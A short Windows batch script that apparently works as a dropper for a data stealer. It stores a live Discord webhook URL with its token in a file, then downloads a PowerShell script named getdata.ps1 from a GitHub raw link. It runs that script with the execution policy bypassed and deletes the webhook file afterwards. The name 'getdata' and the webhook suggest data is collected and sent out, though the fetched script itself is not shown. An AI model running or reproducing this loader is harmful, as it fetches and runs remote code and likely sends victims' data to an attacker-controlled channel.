@echo off
echo https://discord.com/api/webhooks/1505641931126866000/WSFPpjCKn_M3VAiaRCmlNYEnuX8z8OaTjJHKKbcDJ6Y2RB5r08MHjzgquVi5npspZBAa>discord_webhook.txt
if not exist "%~dp0getdata.ps1" (
  curl -L "https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1" -o "getdata.ps1"
)
powershell.exe -ExecutionPolicy Bypass -File "%~dp0getdata.ps1"
timeout 10 >nul
del discord_webhook.txt
